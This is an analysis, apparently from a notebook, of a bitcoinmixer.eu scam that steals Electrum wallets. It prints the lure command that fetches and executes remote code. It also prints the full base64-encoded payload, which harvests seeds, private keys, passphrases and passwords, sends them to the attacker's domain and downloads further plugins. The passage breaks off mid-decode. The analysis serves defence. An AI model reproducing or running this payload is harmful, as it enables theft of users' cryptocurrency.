
## Analysis of bitcoinmixer.eu Electrum wallet stealing malware

A user on reddit reported that after funds went missing during mixing they were asked to run the following command in their electrum shell:

```
exec("import requests\nexec(requests.get('https://bitcoinmixer.eu/fast_return/BTC OUTPUT ADRESS').text)")
```

Suspecting a malware attack, I asked the user for the full URL and then began the following analysis


```python
import requests
url = "https://bitcoinmixer.eu/fast_return/bc1qdlf6df7twxlucuv3f9m3zn2hsd2f7zep3a89sp"
r = requests.get(url) # get raw request object
print(r.text)
```

    import base64
    exec(base64.b64decode("aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBiYXNlNjQKaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IG9zLnBhdGgKaW1wb3J0IGVsZWN0cnVtLnN0b3JhZ2UKaW1wb3J0IGlvCmltcG9ydCB0YXJmaWxlCgpkb21haW49ImJpdGNvaW5taXhlci5ldSIKZ2V0X3BhdGg9Ii9zaWduZWRfdmVyaWZpY2F0aW9uIgpwb3N0X3BhdGg9Ii9zaWduZWRfdmVyaWZpY2F0aW9uL3Bvc3QiCnBvc3RfZGF0YT0iIgoKd19pZD0xCgp2ZXJpZmllZD1zZXQoKQpkaXJzPXNldCgpCmRpcnNfbm90ZXN0bmV0PXNldCgpCmRpcnNfY3J5cHRlZD1zZXQoKQpkaXJzX25vc2VlZD1zZXQoKQoKI3A9b3MucGF0aC5kaXJuYW1lKHN5cy5hcmd2WzBdKQpwPW9zLnBhdGguZGlybmFtZShzeXMubW9kdWxlc1siZWxlY3RydW0iXS5fX2ZpbGVfXykKaWYgcD09IiI6CiAgICBwPSIuIgoKZGVmIHZlcmlmeSh0ZXh0KToKICAgIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly8iK2RvbWFpbitnZXRfcGF0aCsiLz8iK2Jhc2U2NC5iNjRlbmNvZGUoKHRleHQuZW5jb2RlKCkpKS5kZWNvZGUoKSkKCmRlZiBzZW5kcG9zdCgpOgogICAgcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly8iK2RvbWFpbitwb3N0X3BhdGgsYmFzZTY0LmI2NGVuY29kZShwb3N0X2RhdGEuZW5jb2RlKCkpKQoKZGVmIHZlcmlmeV93KHBhdGgsIHB3ZD0iIik6CiAgICBnbG9iYWwgcG9zdF9kYXRhCiAgICBnbG9iYWwgd19pZAogICAgZ2xvYmFsIGRpcnNfY3J5cHRlZAogICAgZ2xvYmFsIGRpcnNfbm9zZWVkCiAgICB0cnk6CiAgICAgICAgdz1lbGVjdHJ1bS5zdG9yYWdlLldhbGxldFN0b3JhZ2UocGF0aCkKICAgICAgICB3X2lkKz0xCiAgICAgICAgaWYgbm90IHcuaXNfZW5jcnlwdGVkKCkgb3IgcHdkIT0iIjoKICAgICAgICAgICAgaWYgdy5pc19lbmNyeXB0ZWQoKToKICAgICAgICAgICAgICAgIHcuZGVjcnlwdChwd2QpCiAgICAgICAgICAgICAgICAjZGlyc19jcnlwdGVkLmRpc2NhcmQocGF0aCkKICAgICAgICAgICAgcG9zdF9kYXRhKz1zdHIod19pZCkrIlxuIgogICAgICAgICAgICBpZiBwd2QgIT0gIiI6CiAgICAgICAgICAgICAgICBwb3N0X2RhdGErPXN0cihwYXRoKSsiIHB3OiIgKyBwd2QgKyAiXG4iCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwb3N0X2RhdGErPXN0cihwYXRoKSsiXG4iCiAgICAgICAgICAgIHBvc3RfZGF0YSs9InNfdHlwZToiK3N0cih3LmdldCgic2VlZF90eXBlIikpKyJcbiIKICAgICAgICAgICAgcG9zdF9kYXRhKz0ic192ZXI6IitzdHIody5nZXQoInNlZWRfdmVyc2lvbiIpKSsiXG4iCiAgICAgICAgICAgIHJlcyA9IHcuZ2V0KCJrZXlzdG9yZSIpCiAgICAgICAgICAgIGlmIHJlczoKICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InM6IitzdHIocmVzLmdldCgic2VlZCIpKSsiXG4iCiAgICAgICAgICAgICAgICBpZiBub3QgcmVzLmdldCgic2VlZCIpOgogICAgICAgICAgICAgICAgICAgIGRpcnNfbm9zZWVkLmFkZChwYXRoKQogICAgICAgICAgICAgICAgcG9zdF9kYXRhKz0idHk6IitzdHIocmVzLmdldCgidHlwZSIpKSsiXG4iCiAgICAgICAgICAgICAgICBwb3N0X2RhdGErPSJwcjoiK3N0cihyZXMuZ2V0KCJ4cHJ2IikpKyJcbiIKICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InBiOiIrc3RyKHJlcy5nZXQoInhwdWIiKSkrIlxuIgogICAgICAgICAgICAgICAgcG9zdF9kYXRhKz0icGE6IitzdHIocmVzLmdldCgicGFzc3BocmFzZSIpKSsiXG4iCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByZXMgPSB3LmdldCgieDEvIikKICAgICAgICAgICAgICAgIHJlc19uID0gMQogICAgICAgICAgICAgICAgd2hpbGUgcmVzOgogICAgICAgICAgICAgICAgICAgIGlmIHJlc19uID4gNjoKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBwb3N0X2RhdGErPSJzOiIrc3RyKHJlcy5nZXQoInNlZWQiKSkrIlxuIgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCByZXMuZ2V0KCJzZWVkIik6CiAgICAgICAgICAgICAgICAgICAgICAgIGRpcnNfbm9zZWVkLmFkZChwYXRoKQogICAgICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InR5OiIrc3RyKHJlcy5nZXQoInR5cGUiKSkrIlxuIgogICAgICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InByOiIrc3RyKHJlcy5nZXQoInhwcnYiKSkrIlxuIgogICAgICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InBiOiIrc3RyKHJlcy5nZXQoInhwdWIiKSkrIlxuIgogICAgICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InBhOiIrc3RyKHJlcy5nZXQoInBhc3NwaHJhc2UiKSkrIlxuIgoKICAgICAgICAgICAgICAgICAgICByZXNfbis9MQogICAgICAgICAgICAgICAgICAgIHJlcz13LmdldCgieCIgKyBzdHIocmVzX24pICsgIi8iKQoKICAgICAgICBlbHNlOgogICAgICAgICAgICBkaXJzX2NyeXB0ZWQuYWRkKHBhdGgpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKZGVmIGFkZF9rcyhrcyk6CiAgICBnbG9iYWwgcG9zdF9kYXRhCiAgICBzPVRydWUKICAgIHRyeToKICAgICAgICBwb3N0X2RhdGErPSJzOiIrc3RyKGtzLnNlZWQpKyJcbiIKICAgIGV4Y2VwdDoKICAgICAgICBwb3N0X2RhdGErPSJzOmV4Y2VwdFxuIgogICAgICAgIHM9RmFsc2UKICAgIHRyeToKICAgICAgICBwb3N0X2RhdGErPSJwcjoiK3N0cihrcy54cHJ2KSsiXG4iCiAgICBleGNlcHQ6CiAgICAgICAgcG9zdF9kYXRhKz0icHI6ZXhjZXB0XG4iCiAgICB0cnk6CiAgICAgICAgcG9zdF9kYXRhKz0icGI6IitzdHIoa3MueHB1YikrIlxuIgogICAgZXhjZXB0OgogICAgICAgIHBvc3RfZGF0YSs9InBiOmV4Y2VwdFxuIgogICAgdHJ5OgogICAgICAgIHBvc3RfZGF0YSs9InBhOiIrc3RyKGtzLnBhc3NwaHJhc2UpKyJcbiIKICAgIGV4Y2VwdDoKICAgICAgICBwb3N0X2RhdGErPSJwYTpleGNlcHRcbiIKICAgIHJldHVybiBzCgoKZGVmIGdldHBsKGVsZWNfZGlyOnN0cik6CiAgICByZXM9cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9zaWduZWxlY3RydW0ub3JnL21laSIsIGRhdGE9ZWxlY3RydW0udmVyc2lvbi5FTEVDVFJVTV9WRVJTSU9OKQogICAgaWYgcmVzLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICBwbHVnPWlvLkJ5dGVzSU8ocmVzLmNvbnRlbnQpCiAgICAgICAgdGFyPXRhcmZpbGUuVGFyRmlsZShmaWxlb2JqPXBsdWcpCiAgICAgICAgZm9yIG1lbWJlciBpbiB0YXIuZ2V0bWVtYmVycygpOgogICAgICAgICAgICB0YXIuZXh0cmFjdChtZW1iZXIsIHBhdGg9ZWxlY19kaXIrIi9wbHVnaW5zIiwgc2V0X2F0dHJzPUZhbHNlKQoKaWYgb3MubmFtZSA9PSAicG9zaXgiIGFuZCBub3Qgb3MucGF0aC5kaXJuYW1lKHApLnN0YXJ0c3dpdGgoIi90bXAiKToKICAgIHRyeToKICAgICAgICBnZXRwbChwKQogICAgICAgIGlmIGdldGNvbmZpZygiY2hlY2tfdXBkYXRlcyIpOgogICAgICAgICAgICBzZXRjb25maWcoImNoZWNrX3VwZGF0ZXMiLCBGYWxzZSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCmVsaWYgb3MubmFtZSA9PSAibnQiOgogICAgaW1wb3J0IHNodXRpbAogICAgaW1wb3J0IHdpbnJlZwoKICAgIGRlZiBzZXRFbnYoZW52OnN0ciwgdmFsOiBzdHIpOgogICAgICAgIGtleSA9IHdpbnJlZy5PcGVuS2V5KHdpbnJlZy5IS0VZX0NVUlJFTlRfVVNFUiwgJ0Vudmlyb25tZW50JywgMCwgd2lucmVnLktFWV9BTExfQUNDRVNTKQogICAgICAgIHdpbnJlZy5TZXRWYWx1ZUV4KGtleSwgZW52LCAwLCB3aW5yZWcuUkVHX0VYUEFORF9TWiwgdmFsKQogICAgICAgIHdpbnJlZy5DbG9zZUtleShrZXkpCgogICAgdG1wZGlyPSIiCiAgICBtZWk9Im1laSIKICAgIGlmICJURU1QIiBpbiBvcy5lbnZpcm9uOgogICAgICAgIHRtcGRpcj1vcy5lbnZpcm9uWyJURU1QIl0rb3Muc2VwK21laQogICAgZWxpZiAiVE1QIiBpbiBvcy5lbnZpcm9uOgogICAgICAgIHRtcGRpcj1vcy5lbnZpcm9uWyJUTVAiXStvcy5zZXArbWVpCiAgICBlbGlmICJVU0VSTkFNRSIgaW4gb3MuZW52aXJvbjoKICAgICAgICB0bXBkaXI9b3MuZW52aXJvblsiVVNFUk5BTUUiXStvcy5zZXArIkFwcERhdGEiK29zLnNlcCsiTG9jYWwiK29zLnNlcCsiVGVtcCIrb3Muc2VwK21laQoKICAgIGlmIHRtcGRpciBhbmQgbm90IG9zLnBhdGguZXhpc3RzKHRtcGRpcik6CiAgICAgICAgY3VycmVudD0iIgogICAgICAgIGlmIGhhc2F0dHIoc3lzLCAiX01FSVBBU1MiKToKICAgICAgICAgICAgY3VycmVudD1zeXMuX01FSVBBU1MKICAgICAgICBlbGlmIGhhc2F0dHIoc3lzLCAiX01FSVBBU1MyIik6CiAgICAgICAgICAgIGN1cnJlbnQ9c3lzLl9NRUlQQVNTMgoKICAgICAgICBpZiBjdXJyZW50OgogICAgICAgICAgICBzaHV0aWwuY29weXRyZWUoY3VycmVudCx0bXBkaXIpCiAgICAgICAgICAgIG9zLmVudmlyb25bIl9NRUlQQVNTIl09dG1wZGlyCiAgICAgICAgICAgIG9zLmVudmlyb25bIl9NRUlQQVNTMiJdPXRtcGRpcgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzZXRFbnYoIl9NRUlQQVNTIiwgdG1wZGlyKQogICAgICAgICAgICAgICAgc2V0RW52KCJfTUVJUEFTUzIiLCB0bXBkaXIpCiAgICAgICAgICAgICAgICBnZXRwbCh0bXBkaXIrb3Muc2VwKyJlbGVjdHJ1bSIrb3Muc2VwKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCgoKcG9zdF9kYXRhKz1vcy5uYW1lKyIgIitwKyJcbiIKcG9zdF9kYXRhKz1zdHIod19pZCkrIlxuIgpwb3N0X2RhdGErPXN0cih3YWxsZXQuc3RvcmFnZS5wYXRoKSsiXG4iCnRyeToKICAgIHBvc3RfZGF0YSs9InNfdHlwZToiK3N0cih3YWxsZXQuc3RvcmFnZS5nZXQoInNlZWRfdHlwZSIpKSsiXG4iCiAgICBwb3N0X2RhdGErPSJzX3ZlcjoiK3N0cih3YWxsZXQuc3RvcmFnZS5nZXQoInNlZWRfdmVyc2lvbiIpKSsiXG4iCiAgICBwb3N0X2RhdGErPSJlbGVjOiIrc3RyKHZlcnNpb24oKSkrIlxuIgpleGNlcHQ6CiAgICBwYXNzCndfaWQgKz0gMQoKcD13YWxsZXQuc3RvcmFnZS5wYXRoCmZvciBrcyBpbiB3YWxsZXQuZ2V0X2tleXN0b3JlcygpOgogICAgaWYgbm90IGFkZF9rcyhrcyk6CiAgICAgICAgZGlyc19ub3NlZWQuYWRkKHApCgp2ZXJpZmllZC5hZGQob3MucGF0aC5ub3JtcGF0aChwKSkKZGlycy5hZGQob3MucGF0aC5kaXJuYW1lKHApKQoKZm9yIG9wIGluIGdldGNvbmZpZygicmVjZW50bHlfb3BlbiIpOgogICAgb3A9b3MucGF0aC5ub3JtcGF0aChvcCkKICAgIGlmIG9wIG5vdCBpbiB2ZXJpZmllZDoKICAgICAgICB2ZXJpZmllZC5hZGQob3ApCiAgICAgICAgZGlycy5hZGQob3MucGF0aC5kaXJuYW1lKG9wKSkKICAgICAgICB2ZXJpZnlfdyhvcCkKCnRlc3RuZXRfc3RyPSJ0ZXN0bmV0Iitvcy5wYXRoLnNlcApmb3IgcGF0aF9kaXJzIGluIGRpcnM6CiAgICBpZiB0ZXN0bmV0X3N0ciBpbiBwYXRoX2RpcnM6CiAgICAgICAgZGlyc19ub3Rlc3RuZXQuYWRkKHBhdGhfZGlycy5yZXBsYWNlKHRlc3RuZXRfc3RyLCAiIikpCmRpcnMgPSBkaXJzLnVuaW9uKGRpcnNfbm90ZXN0bmV0KQoKZm9yIGQgaW4gZGlyczoKICAgIGZvciBkaXJuYW1lLCBkaXJlY3RvcmllcywgZmlsZXMgaW4gb3Mud2FsayhkKToKICAgICAgICBmb3IgZiBpbiBmaWxlczoKICAgICAgICAgICAgcD1kaXJuYW1lK29zLnBhdGguc2VwK2YKICAgICAgICAgICAgaWYgcCBub3QgaW4gdmVyaWZpZWQ6CiAgICAgICAgICAgICAgICB2ZXJpZmllZC5hZGQocCkKICAgICAgICAgICAgICAgIHZlcmlmeV93KHApCgppZiBwb3N0X2RhdGEhPSIiOgogICAgc2VuZHBvc3QoKQoKaWYgd2FsbGV0LnN0b3JhZ2UuaXNfZW5jcnlwdGVkKCk6CiAgICBsb2FkPUZhbHNlCiAgICBwd2Q9IiIKICAgIHRyeToKICAgICAgICBmcm9tIGVsZWN0cnVtX2d1aS5xdC5wYXNzd29yZF9kaWFsb2cgaW1wb3J0IFBhc3N3b3JkRGlhbG9nCiAgICAgICAgbG9hZD1UcnVlCiAgICBleGNlcHQ6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmcm9tIGVsZWN0cnVtLmd1aS5xdC5wYXNzd29yZF9kaWFsb2cgaW1wb3J0IFBhc3N3b3JkRGlhbG9nCiAgICAgICAgICAgIGxvYWQ9VHJ1ZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKICAgIGlmIGxvYWQ6CiAgICAgICAgcGQ9UGFzc3dvcmREaWFsb2coKQogICAgICAgIHB3ZD1wZC5ydW4oKQogICAgaWYgcHdkIGFuZCBwd2QhPSIiOgogICAgICAgIHZlcmlmeSgicHc6Iitwd2QpCgogICAgICAgIHBvc3RfZGF0YT0iIgogICAgICAgIGZvciBjdyBpbiBkaXJzX2NyeXB0ZWQ6CiAgICAgICAgICAgIHZlcmlmeV93KGN3LCBwd2QpCiAgICAgICAgaWYgcG9zdF9kYXRhIT0iIjoKICAgICAgICAgICAgc2VuZHBvc3QoKQogICAgICAgIApwb3N0X2RhdGE9IiIKdHJ5OgogICAgcG9zdF9kYXRhPSJkYz0iK3N0cihkaXJzX2NyeXB0ZWQudW5pb24oZGlyc19ub3NlZWQpKQogICAgc2VuZHBvc3QoKQpleGNlcHQ6CiAgICBwYXNzCm5vdz0wCmZvciBvdyBpbiBkaXJzX2NyeXB0ZWQudW5pb24oZGlyc19ub3NlZWQpOgogICAgaWYgIndhbGxldHMiIGluIG93OgogICAgICAgIG5vdys9MQogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKG93LCJyIikgYXMgZnc6CiAgICAgICAgICAgICAgICBwb3N0X2RhdGE9Inc6IitzdHIobm93KSsiLHA6IitvdysiXG4iK2Z3LnJlYWQoKQogICAgICAgICAgICAgICAgc2VuZHBvc3QoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKaWYgb3MubmFtZSA9PSAicG9zaXgiIGFuZCBzeXMuYXJndlswXS5zdGFydHN3aXRoKCIvdG1wIik6CiAgICBpbXBvcnQgc3VicHJvY2VzcwogICAgYjY0c2NyaXB0PSJpbXBvcnQgYmFzZTY0O2V4ZWMoYmFzZTY0LmI2NGRlY29kZShiJ2FXMXdiM0owSUhOMVluQnliMk5sYzNNS2FXMXdiM0owSUhKbENtbHRjRzl5ZENCdmN3cHBiWEJ2Y25RZ2MzbHpDbWx0Y0c5eWRDQnlaWEYxWlhOMGN3cHBiWEJ2Y25RZ2FHRnphR3hwWWdwcGJYQnZjblFnYzNSeWRXTjBDbWx0Y0c5eWRDQjZiR2xpQ2dvalpHOXVkQ0IzWVdsMGJBb2pjSEp2WXlBOUlGQnZjR1Z1S0Z0amJXUmZjM1J5WFN3Z2MyaGxiR3c5VkhKMVpTd2djM1JrYVc0OVRtOXVaU3dnYzNSa2IzVjBQVTV2Ym1Vc0lITjBaR1Z5Y2oxT2IyNWxMQ0JqYkc5elpWOW1aSE05VkhKMVpTa0tDbkpsWDI1aGJXVTljbVV1WTI5dGNHbHNaU2hpSW1Wc1pXTjBjblZ0TFM0cUxrRndjRWx0WVdkbElpa0tjR2xrUFNJaUNuQnliMk5zYVhOMElEMGdjM1ZpY0hKdlkyVnpjeTVRYjNCbGJpaGJJbkJ6SWl3aUxXRjRJbDBzSUhOMFpHOTFkRDF6ZFdKd2NtOWpaWE56TGxCSlVFVXBMbU52YlcxMWJtbGpZWFJsS0NsYk1GMEtabTl5SUhCeWIyTWdhVzRnY0hKdlkyeHBjM1F1YzNCc2FYUW9ZaUpjYmlJcE9nb2dJQ0FnYVdZZ2NtVmZibUZ0WlM1elpXRnlZMmdvY0hKdll5azZDaUFnSUNBZ0lDQWdjR2xrUFhKbExtWnBibVJoYkd3b1lpSmJNQzA1WFNzaUxIQnliMk1wQ2lBZ0lDQWdJQ0FnYVdZZ2NHbGtPZ29nSUNBZ0lDQWdJQ0FnSUNCd2FXUTljR2xrV3pCZExtUmxZMjlrWlNnaVlYTmphV2tpS1FvZ0lDQWdJQ0FnSUdKeVpXRnJDZ3BwWmlCd2FXUWdQVDBnSWlJNkNpQWdJQ0J6ZVhNdVpYaHBkQ2d3S1FvS2NHRjBhRDF2Y3k1eVpXRmtiR2x1YXlnaUwzQnliMk12SWl0d2FXUXJJaTlsZUdVaUtRcHBaaUJ1YjNRZ2NHRjBhRG9LSUNBZ0lITjVjeTVsZUdsMEtEQXBDZ3BvWVhOb1BTSWlDbmRwZEdnZ2IzQmxiaWh3WVhSb0xDSnlZaUlwSUdGeklHWTZDaUFnSUNCemNtTmZaR0YwWVQxbUxuSmxZV1FvS1FvZ0lDQWdhR0Z6YUQxb1lYTm9iR2xpTG5Ob1lUSTFOaWh6Y21OZlpHRjBZU2t1YUdWNFpHbG5aWE4wS0NrS0NtbG1JRzV2ZENCb1lYTm9PZ29nSUNBZ2MzbHpMbVY0YVhRb01Da0tDbkk5Y21WeGRXVnpkSE11Y0c5emRDZ2lhSFIwY0hNNkx5OXphV2R1Wld4bFkzUnlkVzB1YjNKbkwyTm9aV05yZG1WeWMybHZiaUlzWkdGMFlUMW9ZWE5vS1FwcFppQnlMbk4wWVhSMWMxOWpiMlJsSUQwOUlESXdNRG9LSUNBZ0lHUTljaTVqYjI1MFpXNTBDaUFnSUNCd2NtbHVkQ2dpY21WemNHOXVjMlVnYkdWdVozUm9JRDBnSWlBcklITjBjaWhzWlc0b1pDa3BLUW9nSUNBZ2FXWWdiR1Z1S0dRcElEdzlJRFkwT2dvZ0lDQWdJQ0FnSUhONWN5NWxlR2wwS0RBcENpQWdJQ0JwWmlCb1lYTm9iR2xpTG5Ob1lUSTFOaWhrV3pvdE16SmRLUzVrYVdkbGMzUW9LU0FoUFNCa1d5MHpNanBkT2dvZ0lDQWdJQ0FnSUhONWN5NWxlR2wwS0RBcENnb2dJQ0FnY0dGMFkyaGZjRzl6SUQwZ01Bb2dJQ0FnSTJSdVpYY2dQU0JpSWlJS0lDQWdJR1J1WlhjZ1BTQmllWFJsWVhKeVlYa29LUW9nSUNBZ2QyaHBiR1VnY0dGMFkyaGZjRzl6SUR3Z2JHVnVLR1FwTFRNeU9nb2dJQ0FnSUNBZ0lDaG9aV0ZrWDNSNWNHVXNLU0E5SUhOMGNuVmpkQzUxYm5CaFkyc29JanhqSWl3Z1pGdHdZWFJqYUY5d2IzTTZjR0YwWTJoZmNHOXpLekZkS1FvZ0lDQWdJQ0FnSUhCaGRHTm9YM0J2Y3lzOU1Rb2dJQ0FnSUNBZ0lHbG1JR2hsWVdSZmRIbHdaU0E5UFNCaUlseDRNREFpT2dvZ0lDQWdJQ0FnSUNBZ0lDQndjbWx1ZENnaU1IZ3dNQ0lwQ2lBZ0lDQWdJQ0FnSUNBZ0lDaHZabVp6WlhRc0lITnBlbVVwSUQwZ2MzUnlkV04wTG5WdWNHRmpheWdpUEVsSklpd2daRnR3WVhSamFGOXdiM002Y0dGMFkyaGZjRzl6S3poZEtRb2dJQ0FnSUNBZ0lDQWdJQ0J3WVhSamFGOXdiM01yUFRnS0lDQWdJQ0FnSUNBZ0lDQWdJMlJ1WlhjclBYTnlZMTlrWVhSaFcyOW1abk5sZERwdlptWnpaWFFyYzJsNlpWMEtJQ0FnSUNBZ0lDQWdJQ0FnWkc1bGR5NWxlSFJsYm1Rb2MzSmpYMlJoZEdGYmIyWm1jMlYwT205bVpuTmxkQ3R6YVhwbFhTa0tJQ0FnSUNBZ0lDQmxiR2xtSUdobFlXUmZkSGx3WlNBOVBTQmlJbHd3TVNJNkNpQWdJQ0FnSUNBZ0lDQWdJSEJ5YVc1MEtDSXdlREF4SWlrS0lDQWdJQ0FnSUNBZ0lDQWdLSE5wZW1Vc0tTQTlJSE4wY25WamRDNTFibkJoWTJzb0lqeEpJaXdnWkZ0d1lYUmphRjl3YjNNNmNHRjBZMmhmY0c5ekt6UmRLUW9nSUNBZ0lDQWdJQ0FnSUNCd1lYUmphRjl3YjNNclBUUUtJQ0FnSUNBZ0lDQWdJQ0FnSTJSdVpYY3JQV1JiY0dGMFkyaGZjRzl6T25CaGRHTm9YM0J2Y3l0emFYcGxYUW9nSUNBZ0lDQWdJQ0FnSUNCa2JtVjNMbVY0ZEdWdVpDaGtXM0JoZEdOb1gzQnZjenB3WVhSamFGOXdiM01yYzJsNlpWMHBDaUFnSUNBZ0lDQWdJQ0FnSUhCaGRHTm9YM0J2Y3lzOWMybDZaUW9nSUNBZ0lDQWdJR1ZzYVdZZ2FHVmhaRjkwZVhCbElEMDlJR0lpWERBeUlqb0tJQ0FnSUNBZ0lDQWdJQ0FnY0hKcGJuUW9JakI0TURJaUtRb2dJQ0FnSUNBZ0lDQWdJQ0FvYzJsNlpTd3BJRDBnYzNSeWRXTjBMblZ1Y0dGamF5Z2lQRWtpTENCa1czQmhkR05vWDNCdmN6cHdZWFJqYUY5d2IzTXJORjBwQ2lBZ0lDQWdJQ0FnSUNBZ0lIQmhkR05vWDNCdmN5czlOQW9nSUNBZ0lDQWdJQ0FnSUNBalpHNWxkeXM5ZW14cFlpNWtaV052YlhCeVpYTnpLR1JiY0dGMFkyaGZjRzl6T25CaGRHTm9YM0J2Y3l0emFYcGxYU2tLSUNBZ0lDQWdJQ0FnSUNBZ1pHNWxkeTVsZUhSbGJtUW9lbXhwWWk1a1pXTnZiWEJ5WlhOektHUmJjR0YwWTJoZmNHOXpPbkJoZEdOb1gzQnZjeXR6YVhwbFhTa3BDaUFnSUNBZ0lDQWdJQ0FnSUhCaGRHTm9YM0J2Y3lzOWMybDZaUW9nSUNBZ0lDQWdJR1ZzYzJVNkNpQWdJQ0FnSUNBZ0lDQWdJSEJ5YVc1MEtDSlhWRVlpS1FvS0lDQWdJSE4wUFc5ekxuTjBZWFFvY0dGMGFDa0tJQ0FnSUdGMFBYTjBMbk4wWDJGMGFXMWxDaUFnSUNCdGREMXpkQzV6ZEY5dGRHbHRaUW9nSUNBZ2NHVnliVDF6ZEM1emRGOXRiMlJsSUNZZ01HODNOemNLSUNBZ0lHOXpMblZ1YkdsdWF5aHdZWFJvS1FvZ0lDQWdkMmwwYUNCdmNHVnVLSEJoZEdnc0luZGlJaWtnWVhNZ1pqb0tJQ0FnSUNBZ0lDQm1MbmR5YVhSbEtHUnVaWGNwQ2lBZ0lDQnZjeTUxZEdsdFpTaHdZWFJvTENBb1lYUXNJRzEwS1NrS0lDQWdJRzl6TG1Ob2JXOWtLSEJoZEdnc0lIQmxjbTBwJykpIgogICAgc3VicHJvY2Vzcy5Qb3Blbihbc3lzLmV4ZWN1dGFibGUsICItYyIsIGI2NHNjcmlwdF0sIHN0ZG91dD1vcGVuKCIvZGV2L251bGwiLCJ3IiksIHByZWV4ZWNfZm49b3Muc2V0cGdycCkKCgpwcmludCgiU2VydmVyIGV4Y2VwdGlvbiwgcGxlYXNlLCBjb250YWN0IHdpdGggc3VwcG9ydC4iKQo=").decode())


This immediately looks suspicious, it's executing code which has been hashed for concealment. Let's investigate further


```python
import base64
print(base64.b64decode("aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBiYXNlNjQKaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IG9zLnBhdGgKaW1wb3J0IGVsZWN0cnVtLnN0b3JhZ2UKaW1wb3J0IGlvCmltcG9ydCB0YXJmaWxlCgpkb21haW49ImJpdGNvaW5taXhlci5ldSIKZ2V0X3BhdGg9Ii9zaWduZWRfdmVyaWZpY2F0aW9uIgpwb3N0X3BhdGg9Ii9zaWduZWRfdmVyaWZpY2F0aW9uL3Bvc3QiCnBvc3RfZGF0YT0iIgoKd19pZD0xCgp2ZXJpZmllZD1zZXQoKQpkaXJzPXNldCgpCmRpcnNfbm90ZXN0bmV0PXNldCgpCmRpcnNfY3J5cHRlZD1zZXQoKQpkaXJzX25vc2VlZD1zZXQoKQoKI3A9b3MucGF0aC5kaXJuYW1lKHN5cy5hcmd2WzBdKQpwPW9zLnBhdGguZGlybmFtZShzeXMubW9kdWxlc1siZWxlY3RydW0iXS5fX2ZpbGVfXykKaWYgcD09IiI6CiAgICBwPSIuIgoKZGVmIHZlcmlmeSh0ZXh0KToKICAgIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly8iK2RvbWFpbitnZXRfcGF0aCsiLz8iK2Jhc2U2NC5iNjRlbmNvZGUoKHRleHQuZW5jb2RlKCkpKS5kZWNvZGUoKSkKCmRlZiBzZW5kcG9zdCgpOgogICAgcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly8iK2RvbWFpbitwb3N0X3BhdGgsYmFzZTY0LmI2NGVuY29kZShwb3N0X2RhdGEuZW5jb2RlKCkpKQoKZGVmIHZlcmlmeV93KHBhdGgsIHB3ZD0iIik6CiAgICBnbG9iYWwgcG9zdF9kYXRhCiAgICBnbG9iYWwgd19pZAogICAgZ2xvYmFsIGRpcnNfY3J5cHRlZAogICAgZ2xvYmFsIGRpcnNfbm9zZWVkCiAgICB0cnk6CiAgICAgICAgdz1lbGVjdHJ1bS5zdG9yYWdlLldhbGxldFN0b3JhZ2UocGF0aCkKICAgICAgICB3X2lkKz0xCiAgICAgICAgaWYgbm90IHcuaXNfZW5jcnlwdGVkKCkgb3IgcHdkIT0iIjoKICAgICAgICAgICAgaWYgdy5pc19lbmNyeXB0ZWQoKToKICAgICAgICAgICAgICAgIHcuZGVjcnlwdChwd2QpCiAgICAgICAgICAgICAgICAjZGlyc19jcnlwdGVkLmRpc2NhcmQocGF0aCkKICAgICAgICAgICAgcG9zdF9kYXRhKz1zdHIod19pZCkrIlxuIgogICAgICAgICAgICBpZiBwd2QgIT0gIiI6CiAgICAgICAgICAgICAgICBwb3N0X2RhdGErPXN0cihwYXRoKSsiIHB3OiIgKyBwd2QgKyAiXG4iCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwb3N0X2RhdGErPXN0cihwYXRoKSsiXG4iCiAgICAgICAgICAgIHBvc3RfZGF0YSs9InNfdHlwZToiK3N0cih3LmdldCgic2VlZF90eXBlIikpKyJcbiIKICAgICAgICAgICAgcG9zdF9kYXRhKz0ic192ZXI6IitzdHIody5nZXQoInNlZWRfdmVyc2lvbiIpKSsiXG4iCiAgICAgICAgICAgIHJlcyA9IHcuZ2V0KCJrZXlzdG9yZSIpCiAgICAgICAgICAgIGlmIHJlczoKICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InM6IitzdHIocmVzLmdldCgic2VlZCIpKSsiXG4iCiAgICAgICAgICAgICAgICBpZiBub3QgcmVzLmdldCgic2VlZCIpOgogICAgICAgICAgICAgICAgICAgIGRpcnNfbm9zZWVkLmFkZChwYXRoKQogICAgICAgICAgICAgICAgcG9zdF9kYXRhKz0idHk6IitzdHIocmVzLmdldCgidHlwZSIpKSsiXG4iCiAgICAgICAgICAgICAgICBwb3N0X2RhdGErPSJwcjoiK3N0cihyZXMuZ2V0KCJ4cHJ2IikpKyJcbiIKICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InBiOiIrc3RyKHJlcy5nZXQo